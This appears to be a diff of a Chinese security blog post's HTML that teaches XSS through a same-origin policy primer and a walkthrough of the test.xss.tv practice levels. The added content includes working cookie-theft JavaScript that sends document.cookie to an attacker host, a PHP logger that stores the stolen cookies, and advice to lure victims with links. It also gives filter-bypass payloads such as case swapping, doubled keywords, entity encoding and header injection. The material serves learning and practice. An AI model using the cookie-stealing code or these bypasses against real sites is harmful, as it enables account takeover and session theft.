@@ -298,7 +298,7 @@
 	更新于
 	<a href="/2019/03/17/xss的绕过和利用/" itemprop="url">
 		<time datetime="2019-03-17T13:13:21.000Z" itemprop="dateUpdated">
-	  		2019-04-05
+	  		2019-07-30
 	  </time>
 	</a> 	
 
@@ -335,38 +335,156 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<h4 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h4><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p>
+		<h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><p>同源策略（Same origin policy）是一种约定，它是最核心也最基本的安全功能，如果缺少了同源策略，则浏览器的正常功能可能都会受到影响。可以说Web是构建在同源策略基础之上的，浏览器只是针对同源策略的一种实现。</p>
+<p><strong>浏览器的同源策略，限制了来自不同源的“document”或脚本，对当前“document”读取或设置某些属性。</strong></p>
+<p>影响源的因素：host（域名或IP，如果时IP地址则看做一个根域名），子域名，端口，协议。</p>
+<p>下表给出了相对<a href="http://a.xyz.com/dir/page.html同源检测的示例" target="_blank" rel="noopener">http://a.xyz.com/dir/page.html同源检测的示例</a>:</p>
+<table>
+<thead>
+<tr>
+<th>URL</th>
+<th>结果</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>http://a.xyz.com/dir2/other.html</code></td>
+<td>成功</td>
+<td></td>
+</tr>
+<tr>
+<td><code>http://a.xyz.com/dir/inner/another.html</code></td>
+<td>成功</td>
+<td></td>
+</tr>
+<tr>
+<td><code>https://a.xyz.com/secure.html</code></td>
+<td>失败</td>
+<td>不同协议 ( https和http )</td>
+</tr>
+<tr>
+<td><code>http://a.xyz.com:81/dir/etc.html</code></td>
+<td>失败</td>
+<td>不同端口 ( 81和80)</td>
+</tr>
+<tr>
+<td><code>http://a.opq.com/dir/other.html</code></td>
+<td>失败</td>
+<td>不同域名 ( xyz和opq)</td>
+</tr>
+</tbody>
+</table>
+<p>需要注意的是，对当前页面来说，文件放在哪里并不重要，重要的是谁打开了这个文件，谁使用了这个文件，对于文件来说，谁使用了它，谁就是它的源。</p>
+<p>浏览器中，那些带有src属性的标签如：<img><iframe>等，都能够跨域加载资源，实际上就是由浏览器发起一次GET请求。它们和页面中的链接不受同源策略的限制。而XMLHttpRequest<br>受同源策略限制，他只可以访问来自同源的文件。</iframe></p>
+<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>XSS攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS，XSS是一种在web应用中的计算机安全漏洞，它允许恶意web用户将代码植入到提供给其它用户使用的页面中。</p>
 <p>XSS 大致分成三种类型）:</p>
 <pre class="line-numbers language-txt"><code class="language-txt">反射型
 存储型
 DOM 型   如果用是否会存储在服务器上区分的话，DOM型也是反射型。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 <p>原本应该是输入数据的地方，但是却变成成功运行的代码。就是<strong>xss</strong>。</p>
-<p>hacker可以它写了这样一个文件 a.com/test.js</p>
+<h3 id="常用的盗取cookies"><a href="#常用的盗取cookies" class="headerlink" title="常用的盗取cookies"></a>常用的盗取cookies</h3><p>hacker可以它写了这样一个文件 a.com/test.js</p>
 <pre class="line-numbers language-js"><code class="language-js"><span class="token keyword">var</span> img <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"img"</span><span class="token punctuation">)</span>
 img<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">"http://www.a.com/?cookies="</span><span class="token operator">+</span><span class="token function">escape</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
+img<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display<span class="token operator">=</span><span class="token string">'none'</span><span class="token punctuation">;</span>
 document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>img<span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>而对应<a href="http://www.a.com/index.php的代码是这样，目的是记录发送过来的" target="_blank" rel="noopener">www.a.com/index.php的代码是这样，目的是记录发送过来的</a> cookies</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>而对应<a href="http://www.a.com/index.php的代码是这样，目的是记录发送过来的cookies" target="_blank" rel="noopener">www.a.com/index.php的代码是这样，目的是记录发送过来的cookies</a></p>
 <pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
 <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"cookies"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 <span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span>
 <span class="token function">error_log</span><span class="token punctuation">(</span><span class="token variable">$c</span> <span class="token punctuation">.</span><span class="token string">""</span><span class="token punctuation">.</span> <span class="token string">"\n"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">"/var/log/a/cookies"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token delimiter">?></span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h5 id="然后再在输出框中输入"><a href="#然后再在输出框中输入" class="headerlink" title="然后再在输出框中输入 /"></a>然后再在输出框中输入 <script src="//www.a.com/test.js">/</script></h5><p>就会直接将你的 cookies 直接发送到 a.com<br>有了你的 cookies 就为所欲为了，改密码什么的。 现在只需诱导用户（发邮件之类的）点击链接就Ok了 </p>
-<h4 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h4><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token string">"alert(1);"</span><span class="token operator">></span>
+<p>然后再在输出框中输入 <script src="http://www.a.com/test.js"></script><br>就会直接将你的 cookies 直接发送到 a.com<br>这样就不知不觉的有了你的 cookies 就为所欲为了，改密码什么的。 现在只需诱导用户（发邮件之类的）点击链接就Ok了 </p>
+<p><strong>也可利用ceye来打到cooikes</strong><br>这里需要注意的是：可以执行xss的网站必须和你打cookie的地方是能够连通的。（src实际上就是由浏览器发起一次GET请求，必须让可以执行xss的网站能够访问到你打cookie的地方）。</p>
+<h3 id="xss绕过过滤的方式"><a href="#xss绕过过滤的方式" class="headerlink" title="xss绕过过滤的方式"></a>xss绕过过滤的方式</h3><p>学习测试平台：（<a href="http://test.xss.tv/" target="_blank" rel="noopener">http://test.xss.tv/</a>)</p>
+<p>第一关：<br>正常的xss，没有任何过滤。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第二关：<br>通过查看源码，发现源码的<code>&lt;`</code>&gt;<code>被转为实体了。
+![e1Cipd.png](https://s2.ax1x.com/2019/07/28/e1Cipd.png)
+但是我们发现：input的value值里的</code>&lt;&gt;`没有被转为实体。这里我们就可以传入”&gt;来闭合前面的input输入框。所以构造payload。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload："><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>&lt;a id="
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第三关：<br>查看源码发现：我们输入的<code>&lt;&gt;</code>都被转为实体了，我们需要换个思路，我们可以通过事件来执行我们的js代码。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload: ' onclick='alert("1");
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第四关：<br>查看源码发现：value里的<code>&lt;&gt;</code>,被替换成空了，上面的<code>&lt;&gt;</code>被转为实体了，和上关方法一样。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload: " onclick="alert('1');
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第五关：<br>过滤如图：<br><a href="https://imgchr.com/i/e1EBge" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/07/28/e1EBge.png" alt="e1EBge.png"></a><br>on被替换成o_n，所以上述方法行不通了。<br>可以通过a标签的href属性构造payload。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload："><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>javascript:alert(1);<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>&lt;a"
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第六关：<br>第六关过滤了href，但是可以通过大小写绕过。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload："><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">hRef</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>javascript:alert(1);<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>&lt;a"
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第七关：</p>
+<p>我们可以发现传入onclick时，on被替换成空了，这时我们可以尝试双写绕过。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload: " oonnclick="alert(1);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第八关：<br>这里过滤了script,href等，不能通过双写，大小写绕过。这里我们需要用到编码绕过。原因是我们的IE浏览器默认采用的是UNICODE编码，HTML编码可以用&amp;#ASCII方式来写，这种XSS转码支持10进制和16进制，XSS转码则是针对属性所赋的值。</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>
+<span class="token keyword">import</span> re
+
+s<span class="token operator">=</span><span class="token string">'javascript:alert(1);'</span>
+flag_10<span class="token operator">=</span><span class="token string">''</span>
+flag_16<span class="token operator">=</span><span class="token string">''</span>
+<span class="token keyword">for</span> x <span class="token keyword">in</span> xrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    flag_10<span class="token operator">+=</span><span class="token string">'&amp;#'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> #<span class="token number">10</span>进制
+    flag_16<span class="token operator">+=</span><span class="token string">'&amp;#x'</span><span class="token operator">+</span>s<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span> #<span class="token number">16</span>进制
+<span class="token keyword">print</span> flag_10 <span class="token comment" spellcheck="true"># &amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&amp;#59</span>
+<span class="token keyword">print</span> flag_16 <span class="token comment" spellcheck="true"># &amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&amp;#x3b</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-html"><code class="language-html">payload： &amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#49&amp;#41&amp;#59 或
+&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29&amp;#x3b
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>第九关：<br>经过测试发现：填入的链接必须带有<code>http://</code>，所以，我们构造payload。</p>
+<pre><code>payload: &amp;#106&amp;#97&amp;#118&amp;#97&amp;#115&amp;#99&amp;#114&amp;#105&amp;#112&amp;#116&amp;#58&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116&amp;#40&amp;#34http://&amp;#34&amp;#41&amp;#59
+</code></pre><p>第十关：<br>经过测试上面的方法，发现都被转化为实体，编码也并不能绕过。<br>仔细观察页面源代码发现有三个隐藏输入框：<br><img src="https://s2.ax1x.com/2019/07/29/e3fI00.png" alt="e3fI00.png"><br>我们经过测试发现：只有t_sort可以传入数据，但是这里把<code>&lt;&gt;</code>替换成空了，这里我们可以用onclick事件来执行js代码。但是这里有type是hidden，这里我们可以把hidden删了，然后点击输入框就触发了onclick事件。还有onchange事件等。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload： http://test.xss.tv/level10.php?keyword=1&amp;t_sort=%22%20onclick=%22alert(1);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第十一关：<br>我们查看源代码发现，多了个输入框，并且发现t_sort的双引号被转为实体了。<br><img src="https://s2.ax1x.com/2019/07/29/e3Tiy4.png" alt="e3Tiy4.png"><br>所以我们只能考虑下面的隐藏输入框了。<br>我发现从10关进入第11关时，存在t_ref值：<br><img src="https://s2.ax1x.com/2019/07/29/e37YDJ.png" alt="e37YDJ.png"><br>我们抓取从十关到第十一关的包发现，请求头存在Referer字段。这里的值对应了t_ref输入框的value值：<br><img src="https://s2.ax1x.com/2019/07/29/e3HUsg.png" alt="e3HUsg.png"><br>我们修改referer的值就能构造payload。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload：Referer:  " onclick="alert(1);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第十二关：<br>我们查看源代码发现t_ua有value值：<br><img src="https://s2.ax1x.com/2019/07/29/e3bCSf.png" alt="e3bCSf.png"><br>我们抓包构造User-Agent就可以产生xss。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload： User-Agent: " onclick="alert(1);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第十三关：<br>我们抓包发现：cooike值和t_cook的value值一样：<br><img src="https://s2.ax1x.com/2019/07/29/e3qF9x.png" alt="e3qF9x.png"><br><img src="https://s2.ax1x.com/2019/07/29/e3qyKU.png" alt="e3qyKU.png"></p>
+<p>所以我们构造cooike即可。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload： Cookie: user=" onclick="alert(1);
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第十四关：<br>因为环境问题，无法进行测试。所以不能测试，详情参考：<br><a href="https://shuimugan.com/bug/view?bug_no=194934" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=194934</a><br>和<a href="https://blog.csdn.net/weixin_44677409/article/details/91345651#LEVEL14_166" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/91345651#LEVEL14_166</a></p>
+<p>该问题源自一些浏览器查看图片 Exif 信息的插件，如果图片里面含有 XSS 代码，这些插件在展现信息渲染的时候就会被执行，导致在本不存在漏洞的网页中“制造”出 XSS 漏洞。</p>
+<p>第十五关：<br>这里用到了AngularJS框架。<br>发现ng-include有包含文件的意思，也就相当于php里面的include<br>这里我们可以包含第一关来构造我们这关的payload。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload： http://test.xss.tv/level15.php?src=%27.%2flevel1.php%3Fname%3D%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E%27
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第十六关：</p>
+<p>这关过滤了script，空格，把他们替换成<code>&amp;nbsp;</code>这里我们可以用%0a或%0d来替换空格。</p>
+<pre class="line-numbers language-html"><code class="language-html">payload： &lt;img%0Donerror="alert(1);"%0Asrc=1/>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第十七和十八关：<br>这里没看懂。emmm正常的方法。<br>猜测用的是这种方法过滤的<br><img src="https://s2.ax1x.com/2019/07/29/e8PFPS.png" alt="e8PFPS.png"></p>
+<pre class="line-numbers language-html"><code class="language-html">payload： http://test.xss.tv/level17.php?arg01=a&amp;arg02=%20onclick=alert(1);
+        http://test.xss.tv/level17.php?arg01=%20onclick=alert(1)&amp;arg02=b
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>第十九关：<br>Flash的xss</p>
+<pre class="line-numbers language-html"><code class="language-html">payload： http://test.xss.tv/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3Ealex%3C/a%3E
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>第二十关：<br>flash的xss<br>参考链接：<a href="https://www.freebuf.com/sectool/108568.html和https://www.cnblogs.com/kenkofox/p/3405395.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/108568.html和https://www.cnblogs.com/kenkofox/p/3405395.html</a></p>
+<pre class="line-numbers language-html"><code class="language-html">payload： http://test.xss.tv/level20.php?arg01=id&amp;arg02=\%22))}catch(e){}if(!self.a)self.a=!alert(document.cookie)//%26width%26height
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>由于对flash不太了解，这里就不多说什么了，可以看看大神们的讲解。</p>
+<h3 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token operator">&lt;</span>img src<span class="token operator">=</span><span class="token number">1</span> onerror<span class="token operator">=</span><span class="token string">"alert(1);"</span><span class="token operator">></span>
 <span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>
 <span class="token operator">&lt;</span>body onload<span class="token operator">=</span><span class="token string">"alert('xss')"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span>
-<span class="token operator">&lt;</span>p onclick<span class="token operator">=</span><span class="token string">"alert('1')"</span> style<span class="token operator">=</span><span class="token string">"postion:fixed;width:100%;heith:100%"</span><span class="token operator">></span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
+<span class="token operator">&lt;</span>p onclick<span class="token operator">=</span><span class="token string">"alert('1')"</span><span class="token operator">></span><span class="token operator">&amp;</span>nbsp<span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>p<span class="token operator">></span>
 <span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token string">"alert('1')"</span> autofocus<span class="token operator">/</span><span class="token operator">></span>
 
 <span class="token number">1</span><span class="token punctuation">.</span>不使用 " 
-
  <span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span> autofocus<span class="token operator">/</span><span class="token operator">></span>
 
 <span class="token number">2</span><span class="token punctuation">.</span>不使用 '  
-
 <span class="token operator">&lt;</span>input onfocus<span class="token operator">=</span><span class="token string">"alert(/1/)"</span> autofocus<span class="token operator">/</span><span class="token operator">></span>
 
 <span class="token number">3</span><span class="token punctuation">.</span>不使用 <span class="token punctuation">(</span> <span class="token punctuation">)</span>  
@@ -535,7 +653,7 @@ a<span class="token punctuation">.</span>jsp<span class="token operator">/</span
 或者<span class="token operator">&amp;</span>（后端变成切换参数，但在前端就是字符）
 
 
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 	
 	</div>
 	
@@ -576,200 +694,193 @@ a<span class="token punctuation">.</span>jsp<span class="token operator">/</span
 		
 				<li>
 					<div>
-						<a href="/2019/05/14/session反序列化/" title="session反序列化">
-							session反序列化
+						<a href="/2019/07/31/xss-payload/" title="xss payload">
+							xss payload
 						</a>
 						<p>
-							知识储备在php中session存储和反序列化存储在php.ini中的配置：
+							转换脚本#coding=utf-8
+import re
 
-session.save_path=""   --设置session的存储路径
-session.save_handler="" --设定用户自定义存储函数...
+s='javascript:alert(1);'
+flag_10=''
+flag_16=''
+flag_url=''
+for x in xrange(0,len(s)):
+  ...
 						</p>
 					</div>
 
-					<a href="/2019/05/14/session反序列化/" title="session反序列化">				
-						<img src="/images/post-cover/32.jpg" class="relateImg" alt="session反序列化">
+					<a href="/2019/07/31/xss-payload/" title="xss payload">				
+						<img src="/images/post-cover/26.jpg" class="relateImg" alt="xss payload">
 					</a>
 				</li>											
 		
 		
 				<li>
 					<div>
-						<a href="/2019/04/25/sql注入知识总结/" title="sql注入知识总结">
-							sql注入知识总结
+						<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">
+							浏览器解释机制和svg xss
 						</a>
 						<p>
-							前言最近，感觉知识学的有点混乱，来整理一波自己的知识。先总结一下sql注入吧。
-知识储备sql注入中常用到的库和表information_schema库
-
-这个数据库中保存着mysql服务器所保存的所有的其他数就库的信息，如数据库名，...
+							前言最近，再看看xss，发现对xss并不是太了解，学习xss需要了解到浏览器的解释机制。我是看Tuuu Nya师傅文章里推荐的文章（深入理解浏览器解释机制和xss向量编码）。我自己总结一下吧。
+浏览器解析机制浏览器解析一篇HTML文档...
 						</p>
 					</div>
 
-					<a href="/2019/04/25/sql注入知识总结/" title="sql注入知识总结">				
-						<img src="/images/post-cover/26.jpg" class="relateImg" alt="sql注入知识总结">
+					<a href="/2019/07/30/浏览器解释机制和svg-xss/" title="浏览器解释机制和svg xss">				
+						<img src="/images/post-cover/25.jpg" class="relateImg" alt="浏览器解释机制和svg xss">
 					</a>
 				</li>											
 		
 		
 				<li>
 					<div>
-						<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">
-							2019掘安杯writeup
+						<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">
+							2018n1ctf-esay-php复现
 						</a>
 						<p>
-							web部分下载下载与以前见到bugku的题差不多。
-提示：flag.php
-然后下载文件：http://120.79.1.69:10002/?file=flag.php即可得到文件：
+							前言最近做题，两次遇见这个题。第一次看着writeup都没复现成功。emm（菜的真实。。。）。这次自己搭的环境用三种方法来复现这个题。
+环境搭建官方给了环境，有dockerfile。所以比较容易搭建的。官方文件在docker上安装上d...
+						</p>
+					</div>
+
+					<a href="/2019/08/06/2018n1ctf-esay-php复现/" title="2018n1ctf-esay-php复现">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="2018n1ctf-esay-php复现">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">
+							phpinfo中的敏感信息
+						</a>
+						<p>
+							## 
+
+						</p>
+					</div>
+
+					<a href="/2019/08/02/phpinfo中的敏感信息/" title="phpinfo中的敏感信息">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="phpinfo中的敏感信息">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/08/01/docker基础学习/" title="docker基础学习">
+							docker基础学习
+						</a>
+						<p>
+							docker介绍Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。可以模糊的理解为轻量级的虚拟机（其实不是虚拟机）。重要的是开源。。。
+dock...
+						</p>
+					</div>
+
+					<a href="/2019/08/01/docker基础学习/" title="docker基础学习">				
+						<img src="/images/post-cover/27.jpg" class="relateImg" alt="docker基础学习">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/07/24/flask框架/" title="flask框架">
+							flask框架
+						</a>
+						<p>
+							python flask框架hello worldfrom flask import Flask
+
+app = Flask(__name__)
+@app.route('/') 
+
+def index(name):
+    return...
+						</p>
+					</div>
+
+					<a href="/2019/07/24/flask框架/" title="flask框架">				
+						<img src="/images/post-cover/26.jpg" class="relateImg" alt="flask框架">
+					</a>
+				</li>											
+		
+		
+				<li>
+					<div>
+						<a href="/2019/06/16/刷题记录/" title="刷题记录">
+							刷题记录
+						</a>
+						<p>
+							一步步慢慢绕题目：
 &lt;?php
-header('Content-...
+show_source(__FILE__);
+$v1=0;$v2=0;$v3=0;
+$a=(array)json_decode(@$_GET['foo']);
+if(is_array($a)){
+...
 						</p>
 					</div>
 
-					<a href="/2019/04/09/2019掘安杯writeup/" title="2019掘安杯writeup">				
-						<img src="/images/post-cover/21.jpg" class="relateImg" alt="2019掘安杯writeup">
+					<a href="/2019/06/16/刷题记录/" title="刷题记录">				
+						<img src="/images/post-cover/38.jpg" class="relateImg" alt="刷题记录">
 					</a>
 				</li>											
 		
 		
 				<li>
 					<div>
-						<a href="/2019/04/08/php-create-function-代码注入/" title="php create_function()代码注入">
-							php create_function()代码注入
+						<a href="/2019/06/14/哈希长度拓展攻击-hashpump/" title="哈希长度拓展攻击-hashpump">
+							哈希长度拓展攻击-hashpump
 						</a>
 						<p>
-							create_function代码注入string create_function(string $args , string $code)
-$args 变量部分
-$code 方法代码部分
-返回值：以字符串形式返回唯一的函数名，如果出...
+							哈希长度拓展攻击条件需要知道
+
+密文长度 (SECRET)
+明文 （哈希值）
+部分密文内容 （auth）
+
